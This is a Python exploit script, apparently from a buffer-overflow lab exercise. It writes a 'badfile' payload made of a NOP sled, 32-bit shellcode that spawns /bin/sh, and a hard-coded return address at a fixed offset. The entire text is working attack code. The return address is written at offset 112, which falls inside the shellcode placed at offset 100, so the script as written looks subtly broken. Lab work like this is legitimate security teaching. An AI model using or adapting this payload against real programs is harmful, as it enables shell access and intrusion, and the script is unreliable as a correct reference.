#!/usr/bin/python3
import sys

# Actual shellcode to spawn /bin/sh
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80"
).encode('latin-1')

# Total buffer size (517 bytes) with NOP sled
content = bytearray(0x90 for i in range(517))  

# 1. Place the shellcode after some NOPs for safety
start = 100
content[start:start + len(shellcode)] = shellcode

# 2. Set the return address (pointing within the NOP sled)
ret = 0xffffcac0     # Chosen return address
offset = 112         # Calculated offset to the return address

# 3. Write the return address in little-endian format
L = 4  # For 32-bit systems
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

# 4. Write the payload to 'badfile'
with open('badfile', 'wb') as f:
    f.write(content)

